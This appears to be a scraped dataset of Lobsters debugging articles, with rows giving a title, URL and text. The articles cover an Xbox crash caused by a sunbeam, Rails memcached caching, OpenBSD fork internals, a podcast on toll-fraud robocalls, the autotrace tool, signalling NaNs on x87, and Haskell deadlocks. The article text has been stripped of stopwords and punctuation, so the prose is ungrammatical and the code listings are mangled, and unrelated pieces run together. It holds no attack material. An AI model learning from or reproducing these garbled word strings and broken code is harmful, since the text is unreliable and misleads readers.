controller order burning dvd bring xbox back desk crash put back crash something specific setup qa using process elimination requires eliminating variable eventually desperation engineer tried one thing shuffled console sat table boom xbox crashed xbox sitting table crashed middle night sometimes need strange thing science one time stoically engineer set chair gathered requisite quantity red bull bug hunt became bug watch vowed watch xbox run automated testing cursed table saw problem two eye night passed slowly quickly eventually dawn approached game still ran infuriatingly ran sun began rise started consider calling night something interesting finally happened table struck ray light rising sun minute minute sunbeam crept across table towards xbox warm glow quietly enveloping black blob console promptly crashed turn early xbox unit issue graphic card could fault console reached certain temperature nothing could software hardware issue escalated game cleared release red bull swapped beer let honest probably whisky science one bug zero back steamclock scrolling performance bug straightforward process elimination teamwork yesterday tracked crash reporting sdk recent change buddybuild sdk interacts io mean buddybuild instant replay feature cause severe performance degradation visible scrolling feature disabled problem solved next time hit bug defies explanation worth trying channel persistent systematic nature bug hunter came whether bug code party library thermal expansion prototype hardware morning sun solution science maybe little whisky
307,Lobsters,debugging,Debugging,Using Skylight to Solve Real-World Performance Problems [Part III: Code Triage],http://blog.skylight.io/using-skylight-to-solve-real-world-performance-problems-part-3-code-triage/,using skylight solve realworld performance problem part iii code triage,part part ii part ii code triage introduction code triage involved home page quick easy caching pull request confusing cache query query problem collection caching revisiting mental model digging deeper pull request contributing full circle another pull request open source apps sign free trial refer friend,post last ongoing threepart series writeup talk gave railsconf find slide read part part ii series catch video part ii skylight open source series explored spot problematic indexing using skylight installment dig hidden performance issue another open source app code triage introduction code triage code triage open source app built help open source project popular open source project receive lot bug report feature request pull request every day reading huge time sink maintainer skylight involved number popular open source project understand problem pretty well code triage let help favorite project maintainer sending contributor random ticket inboxes daily basis allow help triage github issue pull request way contributor help split workload everyone little bit work day today ten thousand developer signed help thousand open source project site running app scale creates pretty unique challenge quick glance code triage home page reveals popular project show exactly many open issue need triaged lot information render get little slow time however also far one popular page app since everyone see first visit site quick easy caching skylight mark code triage homepage endpoint high agony mean probably get good bang buck choose optimize notably even though lot information home page thing actually change often make page prime candidate caching turn lot performanceminded people already done extensive work code triage thing cached actually already however took closer look page skylight noticed order populate meta tag needed run two query fetch count user project site likely number nt need super uptodate implemented caching submitted pull request cache information hour deploying small change noticed shaved little bit time homepage expected confusing cache query aside header footer code triage homepage time spent request went rendering repository list card even popular project seemed new issue opened handful time day meant card also wellsuited caching mentioned earlier many obvious part app already cached including card fact cached pretty smart way implement caching using naive solution would probably something like however cache call inside loop need read memcached separately would result making one network request every card rendered add lot overhead sort like query problem caching fortunately rail provided collection caching code triage maintainer using optimize endpoint allowed rail read required cache fragment memcached single request eliminates significant overhead however looked closely log realized something wrong rendered collection reposrepohtmlslim cache hit request homepage missing half card cache onetime occurrence big deal rail would simply generate missing content write cache subsequent request would able take advantage cached content strangely however able consistently reproduce cache miss even processing multiple consecutive request home page first thought perhaps cache way small upon investigation realized math nt quite add provisioned memcached store app sure would nice bigger cache card around hundred byte even size would still take least hundred thousand card fill entire cache square cache store card trying cache would still occupy fraction one pixel within square size filling memcached store definitely nt issue maybe something big cache taking space revisiting mental model mental model centered around fact memcached lru least recently used store meant new cache data would push old data first first manner since caching anything big home page mental model suggested memcached would evict older item cache needed order make room card however match observed real world began realize mental model memcached worked must wrong solve mystery needed get better understanding memcached managed data worth noting actually using memcached directly context code triage actually using saas provider implemented proprietary memachedcompatible store therefore following detail specific implementation apply opensource version memcached investigation learned memcached store free space storing thing memory always overhead involved due alignment bookkeeping cost memcached different order manage memory efficiently grouped data trying store different tier based size managed space tier separately able see action running stats item command stat chunksize stat evicted stat evictednonzero stat number stat outofmemory stat chunksize stat evicted stat evictednonzero stat number stat outofmemory stat chunksize stat evicted stat evictednonzero stat number stat outofmemory stat chunksize stat evicted stat evictednonzero stat number stat outofmemory stat chunksize stat evicted stat evictednonzero stat number stat outofmemory stat chunksize stat evicted stat evictednonzero stat number stat outofmemory stat chunksize stat evicted stat evictednonzero stat number stat outofmemory looking output see size different tier number item currently stored tier well many item evicted since card fragment generally around size would end cached bucket number since item bucket number taking space allocated space hold around item worked total storage implication talking similarly sized item might competing much smaller amount space thought still lot smaller originally thought still plenty space look homepage trying cache card enough space hold math still add nt end story however looked closely stats command saw eviction count indeed high bucket evicted almost million item bucket alone supported observation cache overflowing spilling thing fast putting thing point investigation explanation could come must something card bucket taking space somehow getting evicted ideally would opened bucket seen taking space unfortunately saas provider offer ability based research made educated guess memcached feature automatically expires cache entry also known ttl timetolive theory mixing ttl data nonttl data bucket cache store would always choose evict nonttl data first ttl data even considered eviction since card ttl cache pretty full must always first one evicted decided manually flush entire cache sure enough freed space card allowed u achieve cache hit rate homepage resulted pretty dramatic performance improvement digging deeper cache flush solved cache overflow problem investigation also noticed something else strange noteworthy skylight trace endpoint flushed cache even though rail using reading cache fragment single read multi request still spending lot time reading writing cache initial read multi request fact subsequent cache read added double time initial request log showed happening cache read cache write cache read cache write cache read cache write cache read cache write cache read cache write cache read cache write cache read cache write cache read cache write cache read cache write cache read cache write cache read cache write cache read cache write cache read cache write cache read cache write cache read cache write cache read cache write cache read cache write cache read cache write cache read cache write cache read cache write cache read cache write cache read cache write cache read cache write cache read cache write cache read cache write cache read cache write cache read cache write cache write cache write cache write cache write cache write cache write cache write cache write cache write cache write cache write cache write cache write cache write cache write cache write cache write cache write cache write cache write cache write cache write cache write cache write cache write cache write cache write rendered collection reposrepohtmlslim cache hit rendering missing card another cache read even though already knew cache since store return anything value read multi request cache read completely unnecessary wanted able eliminate bar entirely even cache miss furthermore reading log saw missing fragment written cache twice request eventually tracked issue doublewrapping cache block opened pull request address issue great success contributing full circle submitting fix code triage discovered bug rail causing cache item take twice space necessary submitted another pull request time rail fixed bug activesupport cache massively inflated storage size compression enabled default configuration expect fix released rail soon also believe double cache readwrites behavior also arguably bug rail plan upstream patch prevent happening apps started looking way help favorite open source apps using skylight pretty successful accomplishing also ended something even impactful ended finding way contribute back upstream project like rail hope skylight open source program learning ossathon inspire contributor interested joining skylight open source program learn see open source apps action want use skylight work apps sign free trial refer friend get credit
308,Lobsters,debugging,Debugging,OpenBSD Kernel Internals — Creation of process from user-space to kernel space.,https://medium.com/@_neerajpal/openbsd-kernel-internals-creation-of-process-from-user-space-to-kernel-space-31a504389f87,openbsd kernel internals creation process userspace kernel space,uvmuareaalloc threadnew curp uaddr processnew p curpr flag allocpid ispidtaken processnew exit execve happy kernel hacking,nonprivileged allowed count increased maximum resource limit decrease count via chgproccnt passing diff parameter also decrease number process threadsnext uvmuareaalloc function allocates thread uarea memory kernel stack pcb storednow check uaddr variable contain thread address zero decrement count number process threadnow important function threadnew struct proc parent vaddrt uaddr processnew struct proc p struct process parent int flag threadnew curp uaddr threadnew function get userspace process case l process get retrieved pool process procpool via poolget functionthen set state thread sidl mean processthread created fork setp zeroing section proc see code snippet sysprochcode snippet member zeroed upon creation fork via memsetin code snippet variable zeroed via memset upon creation forkthen copying section memcpy look screenshot know field member copiedcode snippet member copied upon forkthe crhold p pucred mean increment reference count struct ucred structure p pucred crref typecast thread addr struct user uaddr save kernel virtual addr uareanow initialize timeoutdummy function show timeoutset function workingtimeoutset timeout b argument mean initialize timeout struture call function b argument voidtimeoutset struct timeout new void fn void void arg new tofunc fn new toarg arg new toflags timeoutinitialized schedulerforkhook parent p macro update pestcpu child parent pestcpupestcpu hold estimate amount cpu process used recently inherit parent scheduler history define schedulerforkhook parent child child pestcpu parent pestcpu return newly created thread p another important function processnew create process similar fashion seen threadnew funcprocessnew struct proc p struct process parent int flag processnew p curpr flag code snippet thing happening like select process processpool via poolget zeroing using memset copying using memcpyso detailed explanation please go threadnew function firstnext initialization process using processinitialize functionprocessinitialize pr p psmainproc original main thread process special handling pxstat signal ptrace behaviour need initial thread p pr mainproc queue referenced head head insert elm tail queue elm p number reference pr psrefcnt process pr process initial cred process initial check new thread new process via list referenced head head pr initialize timeout detail see theadnew process initialization pid allocation take allocpid allocpid return unused pidallocpid internally call call via fully randomized number returned used pidthen availability pid word unused pid verifies whether new pid already taken process verifies one one process process group zombie process using function ispidtaken pidt pid internally call function prfind pidt pid locate process numberpgfind pidt pgid locate process group numberzombiefind pidt pid locate zombie process numbercode snippet allocpid ispidtakennow store pointer parent process increment number reference count process limit structure struct plimit store vnode executable parent vref vref vnode reference code snippet mean valid vnode found increment vusecount variable inside struct vnode structure executablenow calculation setting process flag parent pssugid pssugidexec pspledge psexecpledge pswxneeded pr parent vnode controlling terminal null pscontrolt processnew childabletosharefiledescriptortablewithparent pr psfd fdshare parent share table else pr psfd fdcopy parent copy table childabletosharetheparentssignalactions pr pssigacts sigactsshare parent share else pr pssigacts sigactsinit parent copy childabletosharetheparent addr space pr psvmspace uvmspaceshare parent else pr psvmspace uvmspacefork parent processabletostartprofiling smartprofclock pr start profiling process checkchildabletostartptracing pr psflags parent psflags psptraced checknosignalorzombieatexit pr psflags psnozombie signal zombie exit checksignalsstatswaping pr psflags pssystemupdate psembryo oring psembryo new process yet fledged membarproducer force visibility store preceding memory barrier reach global visibility store memory barrier reach global visibilityin short think used forcefully make visible change globallynow insert new elm pr head list head allprocess directly copy processhasnosignalsstatsorswapping atomically set bitsatomicsetbitsint pr pssystem childissuspendingtheparentprocessuntilthechildis terminated calling exit abnormally make call execve atomically set bit atomicsetbitsint pr psppwait atomicsetbitsint pr psispwait ifdef ktrace ktrace related thing endifcpufork curp p null null func arg arg p create update pcb make child ready run finish creating child thread cpufork copy update pcb make child ready run child exit directly user mode via childreturn first time slice return address space vm call done fork syscall thenincrement number fork system callsupdate vmpages affected fork syscall addition data page stack page else call done vfork syscall thendo fork syscall vfork system call see fork elseincrement number kernel thread created check process traced created fork system call malloc function allocates uninitialized memory kernel address space object whose size specified size sizeof newptstat struct ptracestate newptstat allocate thread id alloctid also calling directly using tfind function finding thread id number insert new element p head allprocess list insert new element p head thread hash list insert new element pr head process hash list insert new element pr curpr element insert new element pr head child process isprocessptraced save parent process id ptracing pointer parent processofchild pointer parent processofcurrentprocess procreparent pr make current process new parent process child pr check whether newptstat contains address case newptstat contains kernel virtual address returned malloc condition true newptstat null set ptrace status set newptstat point ptrace state structure make newptstat point null ptrace status curpr process also pr processcurpr psptstat pereportevent ptracefork pr psptstat pereportevent ptracefork curpr psptstat peotherpid pr pspid pr psptstat peotherpid curpr pspid new process set accounting bit mark completeget nano time start processset accounting flag afork mean forked execedatomically clear bitsthen check new child idle state yes make runnable add run queue forkthreadstart functionif idle state put arg current cpu running onfreeing memory kernel virtual address allocated malloc newptstat via free notify interested party new process via knote update stats counter successfully forkeduvmexpforks fork flag forkppwait uvmexpforksppwait counter fork parent wait flag forksharevm uvmexpforkssharevm counter fork vmspace shared pas pointer new process callerif rnewprocp null rnewprocp p ppwait child psispwait parent go sleep process via tsleep check child started tracing enables current process traced alert parent using sigtrap signalnow return child pid parent processreturn finally seen debugger jump file system call handling setting framesome machine independent mi function defined syssyssyscallmih file like misyscall misyscallreturn michildreturn handling system call trapc control pas sysexecve system call explain later second part also explain trapc code upcoming post already become long postreferences tried cover learned case forgotten missed something please feel free update meif explained something wrongly incorrectly please feel free update correct also learner beginner may happen happy kernel hacking
309,Lobsters,debugging,Debugging,The Case of the Phantom Caller,https://www.gimletmedia.com/reply-all/104-case-phantom-caller,case phantom caller,,pj vogt gimlet reply pj vogtalex goldman alex goldmanpj alex goldmanalex yespj back super tech support case youalex alright super tech support theme music pj obviously super tech support try help listener overly complicated computer problem trying solve one absolutely hardest one ever seenalex oh excited nowpj ok came listener named jodiejodie hello pj hey jodie pj first conversation back marchpj yeah thanks sending support ticket sound weird happening youjodie yeah nobody seem figure work kind web peoplepj problem happening jodie job work new jersey company sell dot law domain name lawyersalex okpj anyway jodie person pick number work starting last december started getting like weird phone callsalex define weirdpj beginning like normal weird would say pick phone hear screeching modem noisejodie like horribly loud feedback um like really loud loud modem pj sometimes would like um melody strange hold music alex ok getting weird phone call like hang move onpj sure thing start happening sitting desk pick phone hear like stranger somewhere world holding phone wherever arejodie sounded like sigh outside yeah like could hear like muffled voice like trafficpj would would like try talking jodie yeah lot would like hello like would get really loud thought somebody pick somebody hear never happenedpj nt pick phone go voicemail actually ended ton recording weird callsalex would like hear lot question would like hear somepj yeah let play one basketball tape alex sound like basketball gamepj yeah think sound like basketball game cause hear ball dribbling actually hear sneaker squeaking alex hear sneaker squeaking beginning could hear child saying something mom like recorded hell going pj know let play another one make confusing like weirder ok alex ok farm tape pj think alex hear bird chirping hear sound like flypj uh huhalex fly pick phone pj knowalex car sound storm siren pj think soalex exhales actually distressingpj knowalex feel badpj know also started getting call like kind dam broken like getting time music jodie get weekend get middle night um like come three voicemail come evening music pj like call thrown totally different place like suddenly middle town square somewhere bell tape pj laundromat reason laundromat tape pj lot office lot muffled conversation stranger muffled conversation tape pj also crystal clear phone call clear conversation tape pj actually feel like private share like one somebody criminal background check somebody elsealex jodie theory pj um like pressed thought going got really embarrassedjodie yeah weird mean day age know cybersecurity thing um know mind like oh gosh like government using phone know like uneducated sure figured email guyspj like maybe nsa somehow accidentally forwarding wiretap know honestly know something happening purpose accident thing clear every day america people private life broadcast jodi asked couple question phone setupjodie ok toshiba phone use precision interconnect like authorized voice data service agentpj got okpj told try get bottom itso decided start one clue every one call jodie shown upon caller id every single one different phone number made list phone number like going start calling phone ringing pj breath god weirdmale voice mmmello pj hi name pj vogt reporter working story somebody getting bunch strange phone call one number gotten call fromman uh calling anybodypj lot awkward conversation people idea talking longest one guy call center ended like consoling himcall center guy yes sir apologize understand like pj apologize upset trying understandcall center guy sorry thatpj need apologize um music pj nobody knew talking like place even match like got called number town squarewoman dental officepj interesting okay um pj number distant ethereal music went female voice carolina renaissance festival open saturday sunday thank calling carolina renaissance festival huzzah pj number call sounded like basketball game belonged super friendly woman montana actually like willing stay phone go calendar make sure date phone call nowhere near sporting event kindmontana woman yeah nothingpj weird alright going see else learn mind call back point montana woman keep calling back curious shit music pj one thing noticed lot people spoke said phone voiceover ip voipalex meaning making call internetpj felt like maybe something jodie voip remember said got company precision interconnect music pj started wonder precision interconnect never heard looked one pretty basic web site almost web presence besides every time tried call phone either nobody would pick someone would tell harley bittman woman supposed talk left help pj hey pj calling back see harley office yetunknown uh hold one second pleasepj sure aggressive ballet hold music play harley hi harley pj hey harley name pj vogt trying get ahold good get phoneharley help pj ok complicated thing um harley wait customer pj reporter helping customer solve interesting phonerelated mysteryharley reporter pj yesharley reporter pj laugh harley someone phone reporter reporter pj ok work company called gimlet harley giblet pj gimlet um harley like little like part chicken like pj giblet likelike drink people supposed reference either harley oh okay alright anyway pj eventually able explain harley going jodie actually play one phone call make senseharley sound like bird pj harley somebody playing gamespj listen like farm like think like like whyharley see harassment would saying thing ya know unless like would pj pretty soon harley like fascinated call like never seen anything like talked realized like big deal harley job brings contact like weird phone malfeasance could ever imagine always busy like literally day thing busy got phone hacker broken one customer phone made expensive long distance callsharley like know terrorist nationspj happens harley yeah time nt say terrorist nation necessarily like people always international customer worth international call pj oh god harley one day ca nt remember call shout someone phone call world pj world someone phone like terrorist nation nt know pj nt know maythah worth international call scenario happening placepj okay harley call terrorist nation looked think referring actually phone scam targeting american used fund terror organizationsalex making phone call fund terrorist organization pj ok real example year agoalex okpj bunch hacker philippine break bunch american phone systemsalex uh huhpj spend weekend dialing redialing expensive number rack hundred thousand dollar chargesalex uh huhpj take money hand sponsor saudi arabiabased terror groupalex convolutedpj yes also explain going jodie checked phone bill completely normalalex rightpj soalex okpj harley like nt know know fishy harley mean thing bother whole story pj mhmharley called back number peoplepj bother harley mean intentional somebody putting different numberpj ohhhhh music pj somebody covering track could tell music ring ring pj meant time call dave maynor ring ring dave maynor hello pj hey dave dave yespj going pj dave guy helped u episode atlanta super tech support super tech support told everything going everything learned like much ado nothing dave none like strange right pj feel strange nt hear think like malfeasance hacking government wiretap et ceteradave logical answer like really like technical problem need debugpj dave told like basically needed like visit jodie office look phone could figure kind banal cross wire created problemalex okpj like ok case could send recording could hear two hour later got message dave said actual hell dave described like interesting going whatever listen like holy crap pj yeahdave yeah like almost like episodic tv show right like ah going happen next pj yeahpj convinced basically like one big story chopped phone call could lay right order would know story police siren tape dave right like alright start correlating would ambulance police car also like church bell something right pj dave ended making big discoveryso got ta play two call came jodi phone three week apart first one march one sound like basketball court boy talking mom tape pj call got march completely different phone number boy talking mom tape pj callalex sigh oh nt give idea might pj neither like important like mean somebody made person person designed something music pj dave fascination recording fascination recording jodie fascination fascination eating bait somebody trap music pj coming break get answer break pj welcome back show dave convinced phone call actually recording made purpose somebodyalex would somebody make recording play people way designed make feel deeply uncomfortable pj dave actually like dunno sure basically money much money made phone fraud somebody would come something new devious unless using make moneyalex would someone make money one call pj actually dave could nt answer like know lot guy work field spend time dabbling field weird see beauty genius bait trap totally invisible dave said disappeared ukraine like country crippled horrible ransomware bug go fix like gone music pj left question basically like month roamed earth looking somebody else could explain trap mei talked like white hat phone hacker berlin seemed promising never heard guy washington state gotten ten year voip hacking dice learned wangiri fraud toll bypass fraud wholesale sip trunking nothing explained spooky call nobody talked even like heard end july found guy santa barbarapj say name like title like want u identify youjames brown sure james brown senior manager cloud operation invocapj james work company call tracking analytics company got james phone thing always like told jodi told phone call james reacted completely differentlypj would hear like ambient recording like god know worldjames yeah laugh pj um sound familiar james yeah verypj really james yeah like cell phone toll free number like office something getting called pj toll free number office work basically different number widely advertised internet go herjames yup probably change probably internet long time pj true like already able fill make feel like close thispj turned james way rabbit hole instance recording james collected curious heard one heard like one sound like outside like something sound almost like air raid siren really lot creepy mejames laugh pj know one james yeah clean actually sound like train hornpj huh james train going yeah funny first heard thought thing like like nuclear like test russia laugh yeahpj feel excited meet spending much time audio call feel like finding somebody like band laugh never meet anybody like bandjames pretty fascinating actually like two half year ago one customer reached customer success team call recording like hey calling listened like got curiosity perked yeah music pj first thing james notice weird phone call going customer numbersalex ok alrightpj um james decides build honeypot register number monitor everything go every weird phone call get record look metadataand figure looking computer program massive computer program designed somebody scrape internet number including jodie place hundred thousand call number every day program designed hide supposed look like normal phone traffic phone carrier nt realize going onjames start ramping hit peak probably around like taper back business hour literally even get even better caught one time messed forgot turn traffic holidaypj laugh james saw traffic go roof realized like two three oclock afternoon cut saw clip like traffic going boop fall offpj wow james usually smart like honor like bank holiday try blend inpj james start going phone company like okay would somebody make money somebody else calling number playing like spooky sound phone line alex laugh pj able piece together explanation going give uh gon na bear mealex okpj ok laugh alex uh laugh thispj toll free number invented okay james way tollfree industry work reverse payment system right toll free number call pay right remote end payspj knew know company toll free number pay phone company dollar whatever phone company take dollar share every phone company helped make connection music pj like making call jodie right place call go like tower near verizon tower manhattan sprint tower new jersey jodiejames hop chain one know dollar phone call getting maybe ten cent right carrier getting ten cent carrier getting ten centspj actually even le money many call happening every single day even though phone company might dividing fraction penny time fraction penny add like million dollarsalex rightpj happened year ago apparently brilliant person like huh would love take money go shady telecom company somewhere like crazy eddie phone service like listen going place ton call though get paid share money james phone call make longer phone call stay money makepj ok get u spooky phone call nowherejames aha let think right pj okjames send bunch phone call silent right take second two second hello hello damn hang phone done gone keep people phone right appeal curiositypj rightpj like first call jodie getting like static music would first draft later call like scammer actually figuring interesting alex brilliant stupid smart timepj laugh music pj also james think like bunch scammer thing think call coming either one small group even like one personand even theory person could say retired mid used work one big phone companiesjames like convinced like someone intimate large scale traffic right pj james say list people knowhow pull scam short basically talked everyone learning itpj ever feel like maybe sitting across person james many timespj really james yeah go conference stuff like people would ask question almost like exchange right would asking question oh interesting interesting start thinking like wonder trying find counterintelligence also saw two occasion within hour attending conference saw traffic shift significantlypj gasp james carrier traffic came changed like like game cat mouse know pj ever wonder person fraudster nt stopped like made lot money know people pursuing james guess afraid think literally thumbing nose government agency look recording use literally reading news article whitehousegov like fcc website laugh like seems like literal thumb think know difficult get caughtpj basically get em got go crazy eddy telecom like listen money making one customer need stop illegal need information hand reason cooperate basically james would need subpoena powerpj yeah say thing say name job pat armor yeah um name pat armor special agent cyber division fbipj james got reinforcement sharing honeypot fbi fcc open investigation asked agent armor like agree james possible whole mess hundred thousand phone call everyday phone company losing untold gob money could really work one person armor lot characteristic call um tend say coming ton different folk guess keep thatpj person person catchable like caught armor yeah caughtpj ok laugh armor yup doubt laugh lot money involvedalex sound awfully confident catch personpj yeah kinda believe laugh um still call jodie back called like actually stop call fbi arrest person think call probably stop basically excited finally know origin weird phone call getting music jodie oh gosh pj yeahjodie fell fell trap used like leave minute picked callpj laugh person probably really like lotjodie aw man laugh mean guess made somebody money pj said could close ticket hung got another phone call phone call though earth removed though mountain carried midst sea though water thereof roar trouble though mountain shake swelling thereof selah river stream whereof shall make glad city god holy place tabernacle high god midst shall moved go shall help rise early heathen raf kingdom move uttered voice earth mountain lord host u god jacob refuge selah come behold work lord desolation hath made earth
310,Lobsters,debugging,Debugging,Autotrace – Debug on Steroids,https://zwischenzugs.com/2018/05/21/autotrace-debug-on-steroids/,autotrace debug steroid,sosreport somecommand z stopped strace p fg lmatfy pause feature record replay zoom move window example install code ack thomas ballinger wonderful terminal whispering talk curtsy python library like published,autotrace tool allows debug process view output multiple debug command record output others review replay output done single window think realtime sosreport cool way learn going run something ever done something like somecommand z stopped somecommand imiell grep somecommand strace p stracelog fg somecommand continues ran process realised want run tracing suspended found pid ran trace command outputting logfiles continued process tedious right lmatfy autotrace automate default find latest backgrounded pid attache run default tracing command record output allows pause replay elsewhere look like something similar scenario remember autotrace run command specify command automatically pause pause session scroll back forth continue tracking suspends process paused feature record replay also automatically record session replay perfect debugging sharing debug information real time example tarred replayed somewhere else zoom zoom hitting session number move window got four command want track output problem supply many command like command run five command example autotrace ping googlecom iostat bash c true cat procpidstatus sleep done vmstat bash c true echo hidden window sleep done last hidden start hitting move pane around main ping one protected like example example work linux work mac need find replacement stracepstreewhatever nmap get sudo autotrace nmap meirionconsultingcom strace p pid tcpdump xx find sudo autotrace find strace p pid monster debug session nmap involving lsof pstree tracking procinterrupts linux sudo autotrace nmap localhost strace p pid tcpdump xx bash c true free sleep done bash c true lsof p pid tail sleep done bash c true pstree p pid tail sleep done bash c true cat procinterrupts sleep done install pip install autotrace code code available ack relies heavily thomas ballinger wonderful terminal whispering talk curtsy python library video like like loading related published may
311,Lobsters,debugging,Debugging,In which the CPU changes my data under my nose,http://troubles.md/posts/i-triple-equals/,cpu change data nose,cpu change data nose imprecise representation decimal number special value forcing rust split comparison trait partial total variant parity quiet bit ieee standard rust quieting nan casting int float tomaka nope allows snans page reference calling convention wrapper around abstraction leaky,cpu change data nose ieee source joke confusion imprecise representation decimal number truth easilyimplementable efficient representation floatingpoint number lot application need high precision easily without without peculiarity though rather pecularity singular specifically existence nan nan weird beast taking possible value could otherwise used real data although sneaky people get away using special value forcing rust split comparison trait partial total variant lot developer time effort spent working precisely handle nan story recent personal contribution time effort particular story nan start strange bug wasmi experimental webassembly interpreter blockchains parity test failing compiled rewriting webassembly test harness correctly report failure narrowed test case looked something like following module func export param x result getlocal x func export param x result getlocal x assertreturn invoke assertreturn invoke assertreturn invoke assertreturn invoke test succeeding bitwise cast integer float viceversa failing furthermore test succeeded ie compiled failed ie compiled lastly difference expected value received value one bit instead returning float bit pattern would return instead worked nan might noticed something expected got bit different right quiet bit unaware quiet bit determines whether number raise exception attempt use ieee standard written time necessarily expected programming language would include exception standard includes provision allow hardwarelevel exception example dividing zero zero idea hardware try execute invalid floating point operation allowed generate signalling nan snan see quiet bit set meaning nan signalling try use value example multiplying another number hardware allowed generate exception return quiet nan qnan quiet bit set say allowed rather ieee leaf unspecified fact far tell arm never generate snans way create reinterpret integer signalling bit set originally thought source problem obvious rust quieting nan casting int float remember seeing tomaka talk rustfest binding c library mentioned rust guarantee nan quiet explicitly handle using float returned c snans allowed checked source frombits nope normal reintepret turn tomaka advice date rust allows snans hunt operating float value looking code looked like take number directly webassembly bytecode interpret float operation required bytecode must correct code compiled worked correctly read bytecode since reading code helping opened lldb debugger attached test binary output cargo test norun stepping function checking return value eventually found culprit fn runreinterpret u mut self context mut functioncontext result instructionoutcome trapkind runtimevalue u fromruntimevalue transmuteinto u let v context valuestackmut popas let v vtransmuteinto call contextvaluestackmut push vinto ok instructionoutcome runnextinstruction vtransmuteinto call returning instead hang like name implies vtransmuteinto transmute reinterpret bit looked source code sure enough impl transmuteinto fn transmuteinto self frombits self back started saw frombits transmute originally thought old version standard library wrote quick test use test blackbox bb test fn itworks asserteq bb bb bb frombits bb tobit blackboxbb function ensures compiler optimise anything particular test succeeds though even ie architecture wasmi test suite fails went back frombits compiled output wasmi disassembled lldb core impl core num float frombits pushl ebp movl esp ebp subl esp movl ebp eax movl ebp ecx movl ecx ebp movss ebp movl eax ebp movss ebp movss ebp movss ebp flds ebp addl esp popl ebp retl first glance look like bunch stuff transmute actually moving data test harness compiled without optimisation default turn optimisation compiles core impl core num float frombits flds esp retl hang flds instruction see debug version disassemble build core impl core num float frombits movd edi retq pretty familiar assembly never seen instruction googling brings page reference say push argument onto fpu register stack see people call actually extension known implementes floating point operation top one common calling convention return integer argument eax floating point argument fpu stack using fstps instruction load returned value control returned caller flds returning argument float ah whenever cpu operates float allowed quieten sure enough fld quietens snans passed lldb read state register memory let check happens flds fstps lldb run snip flds esp retl snip see stopped problematic flds instruction let check data pointed esp ie esp plus lldb register read esp esp lldb xxw go signalling nan passed function ok let see happens calling code lldb si snip fstps esp addl esp popl ebx retl taking top floating point stack storing esp let step one time let fstps instruction run read value memory address lldb si snip addl esp popl ebx retl nop lldb register read esp esp lldb xxw go quiet nan first time seen act returning something function cause test fail would succeeded done inline solution wrote wrapper around convert operation essentially fool cpu thinking value integer unless binary operation pas function us eax register preserve bit pattern since webassembly requires quieten nan binary operation cause problem learned anything matter close metal go never truly total control execution code truly believe ability cpulevel debugging read disassembly still important even age highlevel language abstraction leaky
312,Lobsters,debugging,Debugging,Pinpointing deadlocks in Haskell,https://www.fpcomplete.com/blog/2018/05/pinpointing-deadlocks-in-haskell,pinpointing deadlock haskell,motivation massiv stm async unliftio blocking variable asynchronous exception handling haskell dining philosopher dining philosopher problem timeout conclusion reach u haskell syllabus async exception stm deadlock contact u,concurrent programming hard still remember moment introduction multithreaded programming university new mexico professor grabbed head said demon sort issue arise concurrent setup race condition starvation deadlock data corruption name also applicable haskell post would like introduce simple yet effective way track deadlock motivation unlike imperative programming language functional language huge advantage parallelization computation come naturally almost problem free property referential transparency haskell add even bigger advantage namely type system give guarantee computation indeed safely parallelized recently working parallel array processing library massiv take advantage power order computation balanced among core equivalently automatically custom scheduler implemented would manage work trivial task matter language amazing library available save world hurt like recommend multithreaded programming right bat stm async unliftio unfortunately task hand would become easier used library plus wanted keep dependency footprint minimum thing left mvar primitive working scheduler despite hard thinking get situation occasional consistent deadlock nature deadlock nt really important discussion important deadlock usually look haskell track neither mentioned library actually prevent deadlock occurring method described locating simple work regardless use third party library blocking variable two mutable variable actually block thread ghc either mvar tvar almost guaranteed ghc runtime system rts actually detect blocked variable nt referenced thread still making progress would mean ca nt unblocked reason throw either blockedindefinitelyonmvar blockedindefinitelyonstm exception depending type variable blocked look like terminal thread blocked indefinitely mvar operation thread blocked indefinitely stm transaction impressive considering language normally end forever hanging process must brutally killed time exception nt tell u exactly code deadlock actually happened problem know function code blocking takemvar putmvar readmvar etc therefore positively identify location exception could originated one two occurrence blocking function code probably need clever technique figuring location bunch easy get point desperation process pinpointing deadlock location nt automatic simple reliable need catch mentioned exception tell u exactly deadlock came import controlexception import say haslocked string io io haslocked msg action action catch handler exc blockedindefinitelyonmvar saystring mvar msg throwio exc handler exc blockedindefinitelyonstm saystring stm msg throwio exc besides deadlock detection something else special two exception thrown like asynchronous exception nt considered reason think synchronous know exact location occur fact abuse locate deadlock doubt easy way check exception considered asynchronous λ import controlexception λ asyncexceptionfromexception toexception blockedindefinitelyonmvar maybe blockedindefinitelyonmvar nothing λ asyncexceptionfromexception toexception allocationlimitexceeded maybe allocationlimitexceeded allocation limit exceeded order understand exception better recognize distinction two kind highly recommended reading michael snoyman recent blog post asynchronous exception handling haskell dining philosopher best way understand concept see action let look simple meaningful example consider incorrect implementation famous dining philosopher problem import controlconcurrent import say main io main fork mapm newmvar mapm forkio philosopher fork tail fork philosopher last fork head fork philosopher int int mvar int mvar io philosopher num forkleft forkright dine dine saystring mkmsg num thinking pickupforks forkleft forkright saystring mkmsg num eating threaddelay putdownforks forkleft forkright dine pickupforks mvar mvar io pickupforks takemvar threaddelay takemvar putdownforks mvar mvar io putdownforks putmvar putmvar mkmsg int string string mkmsg num str philosopher show num str run program eventually run deadlock normally might take happen careful placement threaddelays trigger instantaneously stack exec package say ghc philosophershs threaded withrtsoptsn philosopher philosopher thinking philosopher thinking philosopher thinking philosopher thinking philosopher thinking example thread blocked indefinitely mvar operation know exactly problem let pretend need debug looking philosopher function obvious either pickupforks putdownforks function fault use blocking takemvar putmvar function let wrap around place interest new tricky haslocked function philosopher int int mvar int mvar io philosopher num forkleft forkright dine dine saystring mkmsg num thinking haslocked mkmsg num deadlocked picking fork pickupforks forkleft forkright saystring mkmsg num eating threaddelay haslocked mkmsg num deadlocked putting fork putdownforks forkleft forkright dine compiling program running reveal philosopher get deadlocked trying pickup fork philosopher philosopher thinking philosopher thinking philosopher thinking philosopher thinking philosopher thinking mvar philosopher deadlocked picking fork mvar philosopher deadlocked picking fork mvar philosopher deadlocked picking fork mvar philosopher deadlocked picking fork mvar philosopher deadlocked picking fork example thread blocked indefinitely mvar operation move haslocked function deeper invocation tree individual takemvar function order see exactly deadlock occurs timeout important understand approach described blog post nt foolproof best use debugging purpose consider minor change incorrect implementation instead making thread participate algorithm main thread nothing occasionally look mvars without anything unblock main fork mapm newmvar mapm forkio philosopher fork tail fork head fork let wait areempty mapm isemptymvar snd fork threaddelay wait wait well result deadlock rts way knowing since reference fork kept around main thread due usage isemptymvar workaround cope 